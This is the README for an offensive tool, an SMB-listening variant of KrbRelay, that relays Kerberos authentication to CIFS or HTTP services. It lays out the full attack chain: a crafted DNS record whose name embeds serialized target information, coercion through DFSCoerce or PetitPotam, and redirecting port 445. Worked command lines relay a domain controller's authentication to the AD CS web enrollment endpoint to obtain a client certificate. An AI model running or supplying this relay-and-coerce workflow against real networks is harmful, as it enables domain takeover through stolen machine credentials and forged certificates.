# KrbRelay-SMBServer

This version of Krbrelay is intended to act as an SMBServer (instead of DCOM) and relay the kerberos AP-REQ to CIFS or HTTP.<br>
90% of code is taken from the great KrebRelay tool: https://github.com/cube0x0/KrbRelay<br><br>
To have control over SPN, which is mandatory for relaying Kerberos, in this case we need to use James Forshaw  *CredMasrhalTargetInfo()*  trick documented here: https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html<br><br>
All you need is to create a DNS entry with the name of the target server you want relay in the form: *<server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAA* and map it to the ip address of your listening machine.<br>Normally domain users can perform DNS secure updates.
You can use powershell script *invoke-dnsupdate* (https://github.com/Kevin-Robertson/Powermad) for adding a DNS entry<br><br>
You need to trigger the authentication with a third-party tool, for example  DFSCoerce https://github.com/Wh04m1001/DFSCoerce,  PetitPotam https://github.com/topotam/PetitPotam , etc...<br><br>
Given that SMB port is 445 you have two options on the Windows attacker machine:<br>
* use a Linux box acting as redirector
* disable the SERVER serice on your Windows machine
<br><br>

This is a quick and dirty adaptation from original project. 
Code contains a lot of unused stuff.  
I'll leave it to you to clean it up and create a more optimized version ;)
<br>
### Examples

````
# Relay the DC SMB authentication to HTTP (ADCS) web enrollment and request client certificate using a linux box redirecting to windows attacker machine on port 9999:<br>
krbRelay.exe -spn http/adcs-mylab.mylab.local -redirecthost adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -endpoint certsrv  -adcs DomainController -listenerport 9999<br>
In another window:
DFSCoerce.exe -l adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  -t DC-2
(https://github.com/decoder-it/DFSCoerce-exe-2)

# special command line swicthes:
-listener: relay listener port
-redirector: relay server/redirector  mapped to the sepcial DNS entry <server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAA
For detailed usage and command line switches refer to original krbleay tool
````

<img width="1036" alt="Screenshot 2024-10-04 135731" src="https://github.com/user-attachments/assets/e2f95aa4-6c94-4517-b6c8-d7629a19a9f4">
<img width="1001" alt="Screenshot 2024-10-04 141231" src="https://github.com/user-attachments/assets/fd7bb972-0942-48d9-b99b-ba623f2823b0">
